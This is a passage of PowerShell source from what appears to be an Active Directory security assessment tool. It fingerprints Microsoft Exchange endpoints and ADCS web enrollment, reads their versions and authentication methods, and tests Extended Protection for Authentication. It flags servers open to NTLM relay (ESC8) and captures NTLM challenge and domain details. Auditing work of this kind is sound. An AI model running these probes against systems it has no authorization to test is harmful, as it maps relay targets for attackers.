        if (-not $result.ServerHeader -and $owaResult.ServerHeader) {
            $result.ServerHeader = $owaResult.ServerHeader
        }

        # Try to get version from X-OWA-Version header
        if (-not $result.Success -and $owaResult.OWAVersion) {
            $result.Success = $true
            $result.BuildNumber = $owaResult.OWAVersion
            $result.Method = "X-OWA-Version (/owa)"
            Write-Log "[ScanExchange] OWA version detected: $($owaResult.OWAVersion)"
        }

        Write-Log "[ScanExchange] OWA available (HTTP $($owaResult.StatusCode)), Auth: $($owaResult.AuthMethods -join ', ')"
    }
    elseif ($owaResult.Reachable) {
        Write-Log "[ScanExchange] OWA endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test Autodiscover endpoint =====
    $autodiscoverUrl = "https://$targetHost/autodiscover/autodiscover.xml"
    Write-Log "[ScanExchange] Testing Autodiscover endpoint: $autodiscoverUrl"

    $autodiscoverResult = Test-ExchangeEndpoint -Url $autodiscoverUrl -EndpointName "Autodiscover" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($autodiscoverResult.IsExchangeEndpoint) {
        $result.HttpsAvailable = $true
        $result.Endpoints.Autodiscover.Available = $true
        $result.Endpoints.Autodiscover.AuthMethods = $autodiscoverResult.AuthMethods -join ', '

        # Try to get version from X-OWA-Version header
        if (-not $result.Success -and $autodiscoverResult.OWAVersion) {
            $result.Success = $true
            $result.BuildNumber = $autodiscoverResult.OWAVersion
            $result.Method = "X-OWA-Version (/autodiscover)"
            Write-Log "[ScanExchange] Autodiscover version detected: $($autodiscoverResult.OWAVersion)"
        }

        Write-Log "[ScanExchange] Autodiscover available (HTTP $($autodiscoverResult.StatusCode)), Auth: $($autodiscoverResult.AuthMethods -join ', ')"
    }
    elseif ($autodiscoverResult.Reachable) {
        Write-Log "[ScanExchange] Autodiscover endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test EWS endpoint =====
    $ewsUrl = "https://$targetHost/ews/exchange.asmx"
    Write-Log "[ScanExchange] Testing EWS endpoint: $ewsUrl"

    $ewsResult = Test-ExchangeEndpoint -Url $ewsUrl -EndpointName "EWS" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($ewsResult.IsExchangeEndpoint) {
        $result.Endpoints.EWS.Available = $true
        $result.Endpoints.EWS.AuthMethods = $ewsResult.AuthMethods -join ', '

        # Try to get version from X-OWA-Version header (EWS also returns this header)
        if (-not $result.Success -and $ewsResult.OWAVersion) {
            $result.Success = $true
            $result.BuildNumber = $ewsResult.OWAVersion
            $result.Method = "X-OWA-Version (/ews)"
            Write-Log "[ScanExchange] EWS version detected: $($ewsResult.OWAVersion)"
        }

        Write-Log "[ScanExchange] EWS available (HTTP $($ewsResult.StatusCode)), Auth: $($ewsResult.AuthMethods -join ', ')"
    }
    elseif ($ewsResult.Reachable) {
        Write-Log "[ScanExchange] EWS endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test ECP endpoint (always test for auth methods, even if detected via exporttool) =====
    $ecpUrl = "https://$targetHost/ecp/"
    Write-Log "[ScanExchange] Testing ECP endpoint: $ecpUrl"

    $ecpResult = Test-ExchangeEndpoint -Url $ecpUrl -EndpointName "ECP" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($ecpResult.IsExchangeEndpoint) {
        $result.Endpoints.ECP.Available = $true
        $result.Endpoints.ECP.AuthMethods = $ecpResult.AuthMethods -join ', '
        Write-Log "[ScanExchange] ECP available (HTTP $($ecpResult.StatusCode)), Auth: $($ecpResult.AuthMethods -join ', ')"
    }
    elseif ($ecpResult.Reachable) {
        # Load balancer redirect detected - ECP is NOT actually available
        # Reset ECP.Available in case it was set by exporttool (which might have been HTML from the load balancer)
        if ($result.Endpoints.ECP.Available -and -not $result.BuildNumber) {
            # ECP was marked available but we have no version - likely false positive from load balancer HTML
            $result.Endpoints.ECP.Available = $false
        }
        Write-Log "[ScanExchange] ECP endpoint responded but is not Exchange (likely load balancer redirect)"
    }
    elseif ($result.Endpoints.ECP.Available) {
        # ECP was detected via exporttool (we have BuildNumber) but direct test failed - keep it marked as available
        Write-Log "[ScanExchange] ECP detected via exporttool (no auth method info available)"
    }

    # ===== Test MAPI endpoint =====
    $mapiUrl = "https://$targetHost/mapi/"
    Write-Log "[ScanExchange] Testing MAPI endpoint: $mapiUrl"

    $mapiResult = Test-ExchangeEndpoint -Url $mapiUrl -EndpointName "MAPI" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($mapiResult.IsExchangeEndpoint) {
        $result.Endpoints.MAPI.Available = $true
        $result.Endpoints.MAPI.AuthMethods = $mapiResult.AuthMethods -join ', '
        Write-Log "[ScanExchange] MAPI available (HTTP $($mapiResult.StatusCode)), Auth: $($mapiResult.AuthMethods -join ', ')"
    }
    elseif ($mapiResult.Reachable) {
        Write-Log "[ScanExchange] MAPI endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test RPC endpoint =====
    $rpcUrl = "https://$targetHost/rpc/"
    Write-Log "[ScanExchange] Testing RPC endpoint: $rpcUrl"

    $rpcResult = Test-ExchangeEndpoint -Url $rpcUrl -EndpointName "RPC" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($rpcResult.IsExchangeEndpoint) {
        $result.Endpoints.RPC.Available = $true
        $result.Endpoints.RPC.AuthMethods = $rpcResult.AuthMethods -join ', '
        Write-Log "[ScanExchange] RPC available (HTTP $($rpcResult.StatusCode)), Auth: $($rpcResult.AuthMethods -join ', ')"
    }
    elseif ($rpcResult.Reachable) {
        Write-Log "[ScanExchange] RPC endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test PowerShell endpoint =====
    $psUrl = "https://$targetHost/powershell/"
    Write-Log "[ScanExchange] Testing PowerShell endpoint: $psUrl"

    $psResult = Test-ExchangeEndpoint -Url $psUrl -EndpointName "PowerShell" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($psResult.IsExchangeEndpoint) {
        $result.Endpoints.PowerShell.Available = $true
        $result.Endpoints.PowerShell.AuthMethods = $psResult.AuthMethods -join ', '
        Write-Log "[ScanExchange] PowerShell available (HTTP $($psResult.StatusCode)), Auth: $($psResult.AuthMethods -join ', ')"
    }
    elseif ($psResult.Reachable) {
        Write-Log "[ScanExchange] PowerShell endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test ActiveSync endpoint =====
    $asUrl = "https://$targetHost/Microsoft-Server-ActiveSync/"
    Write-Log "[ScanExchange] Testing ActiveSync endpoint: $asUrl"

    $asResult = Test-ExchangeEndpoint -Url $asUrl -EndpointName "ActiveSync" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($asResult.IsExchangeEndpoint) {
        $result.Endpoints.ActiveSync.Available = $true
        $result.Endpoints.ActiveSync.AuthMethods = $asResult.AuthMethods -join ', '
        Write-Log "[ScanExchange] ActiveSync available (HTTP $($asResult.StatusCode)), Auth: $($asResult.AuthMethods -join ', ')"
    }
    elseif ($asResult.Reachable) {
        Write-Log "[ScanExchange] ActiveSync endpoint responded but is not Exchange (likely load balancer redirect)"
    }

    # ===== Test HTTP (non-SSL) OWA as last resort for version =====
    if (-not $result.Success) {
        Write-Log "[ScanExchange] Testing HTTP (non-SSL) for version"

        $httpOwaUrl = "http://$targetHost/owa/"
        $httpResult = Test-ExchangeEndpoint -Url $httpOwaUrl -EndpointName "OWA" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent

        if ($httpResult.IsExchangeEndpoint) {
            $result.HttpAvailable = $true
            $result.Endpoints.OWA.AvailableHttp = $true
            # If OWA wasn't available via HTTPS, update it for HTTP
            if (-not $result.Endpoints.OWA.Available) {
                $result.Endpoints.OWA.Available = $true
                $result.Endpoints.OWA.AuthMethods = $httpResult.AuthMethods -join ', '
            }

            if ($httpResult.OWAVersion) {
                $result.Success = $true
                $result.BuildNumber = $httpResult.OWAVersion
                $result.Method = "X-OWA-Version (HTTP)"
                Write-Log "[ScanExchange] HTTP version detected: $($httpResult.OWAVersion)"
            }
        }
    }

    # Set success if any endpoint was found (even without version)
    if (-not $result.Success) {
        $anyEndpoint = $result.Endpoints.OWA.Available -or $result.Endpoints.ECP.Available -or $result.Endpoints.EWS.Available -or
                       $result.Endpoints.Autodiscover.Available -or $result.Endpoints.MAPI.Available -or $result.Endpoints.RPC.Available -or
                       $result.Endpoints.PowerShell.Available -or $result.Endpoints.ActiveSync.Available

        if ($anyEndpoint) {
            $result.Success = $true
            $result.Error = "Exchange endpoints found but could not determine version"
            Write-Log "[ScanExchange] Endpoints found but version detection failed"
        }
        else {
            $result.Error = "No Exchange endpoints found (server may be offline, blocking requests, or not Exchange)"
            Write-Log "[ScanExchange] No endpoints found for $targetHost"
        }
    }

    # Record per-endpoint transport and derive the global protocol flags. Every detected
    # endpoint except the OWA HTTP fallback is served over HTTPS (all other probe URLs use
    # https://), so a detected endpoint without an HTTP transport defaults to HTTPS. This makes
    # HttpsAvailable reflect ANY endpoint (EWS/MAPI/RPC/... previously did not update it).
    # Additive: never clears a flag.
    foreach ($epName in @('OWA', 'ECP', 'EWS', 'Autodiscover', 'MAPI', 'RPC', 'PowerShell', 'ActiveSync')) {
        $ep = $result.Endpoints.$epName
        if ($ep.Available -and -not $ep.AvailableHttp) { $ep.AvailableHttps = $true }
        if ($ep.AvailableHttp)  { $result.HttpAvailable  = $true }
        if ($ep.AvailableHttps) { $result.HttpsAvailable = $true }
    }

    # Log summary of available endpoints with their auth methods
    $availableEndpoints = @()
    foreach ($ep in @('OWA', 'ECP', 'EWS', 'Autodiscover', 'MAPI', 'RPC', 'PowerShell', 'ActiveSync')) {
        if ($result.Endpoints.$ep.Available) {
            $authStr = if ($result.Endpoints.$ep.AuthMethods) { " ($($result.Endpoints.$ep.AuthMethods))" } else { "" }
            $availableEndpoints += "$ep$authStr"
        }
    }
    if ($availableEndpoints.Count -gt 0) {
        Write-Log "[ScanExchange] Detection complete - Available endpoints: $($availableEndpoints -join ', ')"
    } else {
        Write-Log "[ScanExchange] Detection complete - No Exchange endpoints found"
    }

    # ===== Extended Protection for Authentication (EPA) Test =====
    # Test EPA for EACH endpoint separately because IIS allows different EPA settings per virtual directory
    # Only test if:
    # 1. -TestEPA switch is specified
    # 2. HTTPS is available (EPA only applies to TLS connections)
    # 3. NTLM is in the authentication methods (EPA binds NTLM to TLS channel)
    if ($TestEPA -and $result.Success) {
        Write-Log "[ScanExchange] Testing Extended Protection for Authentication (EPA) per endpoint..."

        # Use longer timeout for EPA test (NTLM handshake needs more time)
        $epaTimeout = [Math]::Max($TimeoutSeconds, 10)

        # Track if we've set the legacy EPA properties (first endpoint with NTLM)
        $legacyEPASet = $false

        # Endpoint URL mapping for EPA testing
        $endpointUrls = @{
            'OWA'          = "https://$targetHost/owa/"
            'ECP'          = "https://$targetHost/ecp/"
            'EWS'          = "https://$targetHost/ews/exchange.asmx"
            'Autodiscover' = "https://$targetHost/autodiscover/autodiscover.xml"
            'MAPI'         = "https://$targetHost/mapi/"
            'RPC'          = "https://$targetHost/rpc/"
            'PowerShell'   = "https://$targetHost/powershell/"
            'ActiveSync'   = "https://$targetHost/Microsoft-Server-ActiveSync/"
        }

        # Test EPA for each available endpoint with NTLM over HTTPS
        foreach ($ep in @('OWA', 'ECP', 'EWS', 'Autodiscover', 'MAPI', 'RPC', 'PowerShell', 'ActiveSync')) {
            if ($result.Endpoints.$ep.Available -and $result.Endpoints.$ep.AuthMethods -match 'NTLM') {
                $epaTestUrl = $endpointUrls[$ep]

                Write-Log "[ScanExchange] Testing EPA for $ep at $epaTestUrl"
                $epaResult = Test-ExtendedProtection -Url $epaTestUrl -TimeoutSeconds $epaTimeout -UserAgent $UserAgent

                # Store EPA result in the endpoint object
                $result.Endpoints.$ep.EPAEnabled = $epaResult.EPAEnabled
                $result.Endpoints.$ep.EPAConfidence = $epaResult.Confidence

                if ($epaResult.Success) {
                    if ($epaResult.EPAEnabled -eq $true) {
                        Write-Log "[ScanExchange] $ep EPA ENABLED ($($epaResult.Confidence) confidence)"
                    }
                    elseif ($epaResult.EPAEnabled -eq $false) {
                        Write-Log "[ScanExchange] $ep EPA DISABLED ($($epaResult.Confidence) confidence) - NTLM relay possible!"
                    }
                    else {
                        Write-Log "[ScanExchange] $ep EPA status: $($epaResult.DiagnosticInfo)"
                    }
                }
                else {
                    Write-Log "[ScanExchange] $ep EPA test failed: $($epaResult.ErrorMessage)"
                }

                # Set legacy properties from first endpoint with NTLM (backward compatibility)
                if (-not $legacyEPASet) {
                    $result.EPAEnabled = $epaResult.EPAEnabled
                    $result.EPAConfidence = $epaResult.Confidence
                    $result.EPADiagnostic = $epaResult.DiagnosticInfo

                    # Capture NTLM information from first successful EPA test
                    if ($epaResult.Type2Received) {
                        $result.NTLMInfo = [PSCustomObject]@{
                            NbComputerName  = $epaResult.NbComputerName      # NetBIOS computer name
                            NbDomainName    = $epaResult.NbDomainName        # NetBIOS domain name
                            DnsComputerName = $epaResult.DnsComputerName     # DNS computer name (FQDN)
                            DnsDomainName   = $epaResult.DnsDomainName       # DNS domain name
                            DnsTreeName     = $epaResult.DnsTreeName         # DNS forest name
                            ServerTimestamp = $epaResult.ServerTimestamp     # Server time (DateTime)
                            NTLMChallenge   = $epaResult.NTLMChallenge       # NTLM challenge (hex)
                            SourceEndpoint  = $ep                            # Which endpoint provided this info
                        }
                        Write-Log "[ScanExchange] NTLM Info captured from $ep - Server: $($epaResult.DnsComputerName), Domain: $($epaResult.DnsDomainName)"
                    }

                    $legacyEPASet = $true
                }
            }
        }

        # If no NTLM endpoints found over HTTPS
        if (-not $legacyEPASet) {
            if (-not $result.HttpsAvailable) {
                $result.EPAEnabled = $false
                $result.EPAConfidence = "High"
                $result.EPADiagnostic = "HTTP only - no TLS channel for EPA to bind to"
                Write-Log "[ScanExchange] EPA not applicable - HTTP only (no TLS)"
            }
            else {
                $result.EPADiagnostic = "NTLM not offered over HTTPS - EPA test not applicable"
                Write-Log "[ScanExchange] EPA test skipped - no NTLM over HTTPS"
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Tests a single Exchange endpoint for availability, authentication methods, and version.
.DESCRIPTION
    Tests whether an HTTP endpoint is a real Exchange endpoint or just a load balancer redirect.

    Key validation logic for redirects (HTTP 301/302):
    - Load balancers often redirect ALL requests to a login page (generic redirect)
    - Real Exchange redirects go to Exchange-specific paths (e.g., /owa/auth/logon.aspx)
    - We validate the Location header to distinguish between these cases

    Exchange-specific redirect patterns:
    - /owa/auth/logon.aspx (OWA login)
    - /owa/auth/errorFE.aspx (OWA error)
    - /ecp/auth/logon.aspx (ECP login)
    - /autodiscover/* (Autodiscover redirects)
    - /ews/* (EWS redirects)
    - /mapi/* (MAPI redirects)
    - /rpc/* (RPC redirects)
    - /powershell/* (PowerShell redirects)
    - /Microsoft-Server-ActiveSync/* (ActiveSync redirects)
#>
function Test-ExchangeEndpoint {
    [CmdletBinding()]
    param(
        [string]$Url,
        [string]$EndpointName,
        [int]$TimeoutSeconds,
        [string]$UserAgent
    )

    $endpointResult = [PSCustomObject]@{
        Reachable          = $false      # Server responded (any HTTP response)
        IsExchangeEndpoint = $false      # Confirmed to be Exchange (not a load balancer redirect)
        StatusCode         = $null
        AuthMethods        = @()
        ServerHeader       = $null
        OWAVersion         = $null
        RedirectLocation   = $null       # For debugging redirect issues
    }

    # Validate URL before creating WebRequest
    if ([string]::IsNullOrWhiteSpace($Url)) {
        Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Empty URL provided"
        return $endpointResult
    }

    $response = $null

    # Use Script-scope redirect patterns defined at module level
    $exchangeRedirectPatterns = $Script:ExchangeRedirectPatterns

    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = $UserAgent
        $request.AllowAutoRedirect = $false  # Don't follow redirects to capture auth headers

        $response = $request.GetResponse()
        $statusCode = [int]$response.StatusCode
        $endpointResult.Reachable = $true
        $endpointResult.StatusCode = $statusCode
        $endpointResult.ServerHeader = $response.Headers['Server']
        $endpointResult.OWAVersion = $response.Headers['X-OWA-Version']

        # Check if this is a redirect (301/302) - even though we disabled auto-redirect,
        # some servers return 302 as a "success" response
        if ($statusCode -in @(301, 302)) {
            $location = $response.Headers['Location']
            $endpointResult.RedirectLocation = $location

            Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Got redirect (HTTP $statusCode), checking location: $location"

            # Validate if redirect goes to an Exchange-specific path
            $isExchangeRedirect = $false
            if ($location) {
                foreach ($pattern in $exchangeRedirectPatterns) {
                    if ($location.ToLower().Contains($pattern.ToLower())) {
                        $isExchangeRedirect = $true
                        Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect to Exchange path (matched $pattern)"
                        break
                    }
                }
                if (-not $isExchangeRedirect) {
                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect to non-Exchange path: $location"
                }
            }

            $endpointResult.IsExchangeEndpoint = $isExchangeRedirect

            # For Exchange redirects, follow to get auth methods
            if ($isExchangeRedirect -and $location) {
                try {
                    $redirectUrl = $location
                    if ($location -match '^/') {
                        $uri = [System.Uri]$Url
                        $redirectUrl = "$($uri.Scheme)://$($uri.Host)$location"
                    }

                    $redirectRequest = [System.Net.HttpWebRequest]::Create($redirectUrl)
                    $redirectRequest.Method = 'GET'
                    $redirectRequest.Timeout = $TimeoutSeconds * 1000
                    $redirectRequest.ReadWriteTimeout = $TimeoutSeconds * 1000
                    $redirectRequest.UserAgent = $UserAgent
                    $redirectRequest.AllowAutoRedirect = $false

                    try {
                        $redirectResponse = $redirectRequest.GetResponse()
                        # 200 OK from redirect target - could be Forms auth (login page) or Windows Integrated Auth (Kerberos)
                        if ($redirectResponse) {
                            $redirectStatusCode = [int]$redirectResponse.StatusCode
                            if ($redirectStatusCode -eq 200) {
                                # Check for WWW-Authenticate header first (may indicate Windows Integrated Auth succeeded)
                                $redirectAuth = $redirectResponse.Headers['WWW-Authenticate']
                                if ($redirectAuth) {
                                    $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
                                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect target returns 200 OK with auth header: $($endpointResult.AuthMethods -join ', ')"
                                }
                                else {
                                    # No WWW-Authenticate header with 200 OK typically indicates Forms-based authentication
                                    $endpointResult.AuthMethods = @('Forms')
                                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect target returns 200 OK (Forms-based auth)"
                                }

                                # Extract X-OWA-Version from redirect target response
                                $redirectOWAVersion = $redirectResponse.Headers['X-OWA-Version']
                                if ($redirectOWAVersion -and -not $endpointResult.OWAVersion) {
                                    $endpointResult.OWAVersion = $redirectOWAVersion
                                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: OWA version from redirect: $redirectOWAVersion"
                                }
                            }
                            try { $redirectResponse.Close() } catch { }
                            try { $redirectResponse.Dispose() } catch { }
                        }
                    }
                    catch [System.Net.WebException] {
                        $redirectEx = $_.Exception
                        if ($redirectEx.Response) {
                            $redirectAuth = $redirectEx.Response.Headers['WWW-Authenticate']
                            if ($redirectAuth) {
                                $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
                                Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Got auth methods from redirect target: $($endpointResult.AuthMethods -join ', ')"
                            }

                            # Extract X-OWA-Version from redirect error response (401, 403, etc.)
                            $redirectOWAVersion = $redirectEx.Response.Headers['X-OWA-Version']
                            if ($redirectOWAVersion -and -not $endpointResult.OWAVersion) {
                                $endpointResult.OWAVersion = $redirectOWAVersion
                                Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: OWA version from redirect error response: $redirectOWAVersion"
                            }

                            try { $redirectEx.Response.Close() } catch { }
                            try { $redirectEx.Response.Dispose() } catch { }
                        }
                    }
                }
                catch {
                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Could not follow redirect: $_"
                }
            }
        }
        else {
            # Success (200 OK) - this IS an Exchange endpoint
            $endpointResult.IsExchangeEndpoint = $true

            # Check for WWW-Authenticate header even on 200 OK
            # (Windows Integrated Auth may auto-authenticate and still include the header)
            $wwwAuth = $response.Headers['WWW-Authenticate']
            if ($wwwAuth) {
                $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: 200 OK with WWW-Authenticate: $($endpointResult.AuthMethods -join ', ')"
            }
        }
    }
    catch [System.Net.WebException] {
        $webEx = $_.Exception
        try {
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                $endpointResult.StatusCode = $statusCode

                # 401 Unauthorized = endpoint exists, requires auth (this IS Exchange)
                # 403 Forbidden = endpoint exists, access denied (this IS Exchange)
                # 440 = Login Timeout (Exchange specific - this IS Exchange)
                if ($statusCode -in @(401, 403, 440)) {
                    $endpointResult.Reachable = $true
                    $endpointResult.IsExchangeEndpoint = $true

                    # Extract WWW-Authenticate header
                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
                    if ($wwwAuth) {
                        $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                    }

                    # Capture server and version headers
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    $endpointResult.OWAVersion = $webEx.Response.Headers['X-OWA-Version']
                }
                # 404 Not Found - Server is reachable but endpoint doesn't exist
                elseif ($statusCode -eq 404) {
                    $endpointResult.Reachable = $true
                    $endpointResult.IsExchangeEndpoint = $false
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: HTTP 404 - endpoint not found (server reachable)"
                }
                # 500/502/503 - Server errors indicate the endpoint exists but has issues
                # Still mark as reachable (server responded) but NOT as Exchange endpoint
                elseif ($statusCode -in @(500, 502, 503)) {
                    $endpointResult.Reachable = $true
                    $endpointResult.IsExchangeEndpoint = $false
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Server error (HTTP $statusCode) - endpoint may exist but has issues"
                }
                # 301/302 Redirect - need to validate WHERE it redirects to
                elseif ($statusCode -in @(301, 302)) {
                    $endpointResult.Reachable = $true

                    # Get the redirect location
                    $location = $webEx.Response.Headers['Location']
                    $endpointResult.RedirectLocation = $location
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    $endpointResult.OWAVersion = $webEx.Response.Headers['X-OWA-Version']

                    # Validate if redirect goes to an Exchange-specific path
                    $isExchangeRedirect = $false
                    if ($location) {
                        Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Checking redirect location: $location"
                        foreach ($pattern in $exchangeRedirectPatterns) {
                            # Use simple string contains check instead of regex
                            if ($location.ToLower().Contains($pattern.ToLower())) {
                                $isExchangeRedirect = $true
                                Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect to Exchange path (matched $pattern)"
                                break
                            }
                        }

                        if (-not $isExchangeRedirect) {
                            Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect to non-Exchange path (load balancer?): $location"
                        }
                    }
                    else {
                        Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Redirect without Location header"
                    }

                    $endpointResult.IsExchangeEndpoint = $isExchangeRedirect

                    # For real Exchange redirects, try to get auth methods from the redirect target
                    # Note: 302 redirects typically don't have WWW-Authenticate headers themselves
                    if ($isExchangeRedirect -and $location) {
                        # First try to get from this response (unlikely but possible)
                        $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
                        if ($wwwAuth) {
                            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                        }
                        else {
                            # Follow the redirect to get auth methods from the target
                            try {
                                # Build absolute URL if location is relative
                                $redirectUrl = $location
                                if ($location -match '^/') {
                                    # Relative path - construct absolute URL
                                    $uri = [System.Uri]$Url
                                    $redirectUrl = "$($uri.Scheme)://$($uri.Host)$location"
                                }

                                $redirectRequest = [System.Net.HttpWebRequest]::Create($redirectUrl)
                                $redirectRequest.Method = 'GET'
                                $redirectRequest.Timeout = $TimeoutSeconds * 1000
                                $redirectRequest.ReadWriteTimeout = $TimeoutSeconds * 1000
                                $redirectRequest.UserAgent = $UserAgent
                                $redirectRequest.AllowAutoRedirect = $false

                                try {
                                    $redirectResponse = $redirectRequest.GetResponse()
                                    # 200 OK - no auth required (unlikely)
                                    if ($redirectResponse) {
                                        try { $redirectResponse.Close() } catch { }
                                        try { $redirectResponse.Dispose() } catch { }
                                    }
                                }
                                catch [System.Net.WebException] {
                                    $redirectEx = $_.Exception
                                    if ($redirectEx.Response) {
                                        $redirectAuth = $redirectEx.Response.Headers['WWW-Authenticate']
                                        if ($redirectAuth) {
                                            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
                                            Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Got auth methods from redirect target: $($endpointResult.AuthMethods -join ', ')"
                                        }
                                        try { $redirectEx.Response.Close() } catch { }
                                        try { $redirectEx.Response.Dispose() } catch { }
                                    }
                                }
                            }
                            catch {
                                Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Could not follow redirect to get auth methods: $_"
                            }
                        }
                    }
                }
            }
        }
        finally {
            # Dispose WebException response
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
        }
    }
    catch {
        # Connection failed, timeout, etc. - endpoint not reachable
        Write-Log "[Test-ExchangeEndpoint] ${EndpointName}: Connection failed - $($_.Exception.Message)"
    }
    finally {
        if ($response) {
            try { $response.Close() } catch { }
            try { $response.Dispose() } catch { }
        }
    }

    return $endpointResult
}

#endregion

#region ===== ADCS WEB ENROLLMENT DETECTION =====

<#
.SYNOPSIS
    Internal function to detect ADCS Web Enrollment configuration.
.DESCRIPTION
    Tests for ADCS Certificate Services web enrollment endpoints:
    - /certsrv/ (main web enrollment interface)
    - Tests both HTTP and HTTPS availability
    - Extracts authentication methods from WWW-Authenticate header
    - Detects server type from response headers
.PARAMETER Hostname
    Target ADCS server hostname.
.PARAMETER TimeoutSeconds
    Request timeout.
.PARAMETER UserAgent
    User-Agent header.
.PARAMETER CAName
    Optional CA common name for CES endpoint testing.
    If provided, the CES URL will be constructed as: https://<hostname>/<CAName>_CES_Kerberos/service.svc
.RETURNS
    PSCustomObject with availability and configuration details.
#>
function Invoke-ADCSScanInternal {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Hostname,

        [Parameter(Mandatory = $false)]
        [int]$TimeoutSeconds = 5,

        [Parameter(Mandatory = $false)]
        [string]$UserAgent,

        [Parameter(Mandatory = $false)]
        [string]$CAName,

        [Parameter(Mandatory = $false)]
        [switch]$TestEPA
    )

    # Normalize hostname - extract FQDN only (remove protocol, path, port if present)
    # Input can be: "ca.contoso.com", "https://ca.contoso.com", "https://ca.contoso.com/certsrv/", "ca.contoso.com:443"
    $targetHost = $Hostname -replace '^https?://', ''  # Remove protocol
    $targetHost = $targetHost -replace '/.*$', ''       # Remove path and everything after first /
    $targetHost = $targetHost -replace ':\d+$', ''      # Remove port number
    $targetHost = $targetHost.Trim()

    $result = [PSCustomObject]@{
        Success          = $false
        Hostname         = $targetHost  # Return normalized hostname (FQDN only)
        HttpAvailable    = $false
        HttpsAvailable   = $false
        HttpStatusCode   = $null
        HttpsStatusCode  = $null
        ServerHeader     = $null
        # Per-endpoint availability, auth methods, and EPA status
        # EPA is tested per endpoint because IIS allows different EPA settings per virtual directory
        # Available = reachable via any transport; AvailableHttp / AvailableHttps record the
        # specific transport(s) so endpoint lines can be rendered per endpoint instead of from
        # the global HttpAvailable / HttpsAvailable flags. CEP/CES are HTTPS-only; CertSrv and
        # NDES can appear on either transport.
        Endpoints        = [PSCustomObject]@{
            CertSrv      = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /certsrv/
            CEP          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /ADPolicyProvider_CEP_*/
            CES          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /<CAName>_CES_*/
            NDES         = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /CertSrv/mscep/
        }
        # Legacy EPA properties (for backward compatibility) - reflects first endpoint with NTLM
        EPAEnabled       = $null         # $true = EPA active (secure), $false = EPA not active (ESC8 vulnerable), $null = not tested
        EPAConfidence    = $null         # "High", "Medium", "Low", "Unknown"
        EPADiagnostic    = $null         # Diagnostic info for EPA test
        # NTLM information from Type2 challenge (populated when -TestEPA is used)
        NTLMInfo         = $null         # PSCustomObject with NTLM details from first successful EPA test
        Error            = $null
    }

    # Validate hostname
    if ([string]::IsNullOrWhiteSpace($targetHost)) {
        $result.Error = "Invalid or empty hostname"
        return $result
    }

    # Validate and sanitize CAName if provided (prevent path traversal and injection)
    $sanitizedCAName = $null
    if ($CAName) {
        # CA names should only contain alphanumeric, spaces, hyphens, and underscores
        # Reject anything that looks like path traversal or URL encoding
        if ($CAName -match '[/\\%<>"|?*:]' -or $CAName -match '\.\.') {
